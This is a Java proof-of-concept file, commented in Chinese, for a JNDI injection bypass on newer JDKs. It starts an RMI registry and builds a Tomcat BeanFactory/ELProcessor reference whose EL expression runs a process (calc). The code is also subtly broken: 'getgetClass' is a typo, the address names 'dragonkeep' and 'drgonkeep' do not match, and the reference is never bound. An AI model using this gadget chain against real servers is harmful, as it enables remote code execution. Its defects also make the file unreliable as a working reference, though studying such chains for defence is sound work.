import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


/*
* 这个模块主要编写一些JNDI高版本的绕过技巧，也是网上常见的几种
* */
/*
* 这个ReferenceFactory，主要是利用Tomcat中的
*
* */
public class JNDI_ReferenceFactory {
    public static void main(String[] args) throws Exception{
        int RMIPort = 1099;
        Registry registry = LocateRegistry.createRegistry(RMIPort);
        ResourceRef resourceRef=new ResourceRef(
                "javax.el.ELProcessor", null, "", "", true,
                "org.apache.naming.factory.BeanFactory",null
        );
        resourceRef.add(new StringRefAddr("forceString", "dragonkeep=eval"));
        resourceRef.add(new StringRefAddr("drgonkeep","\"\".getgetClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

    }
}
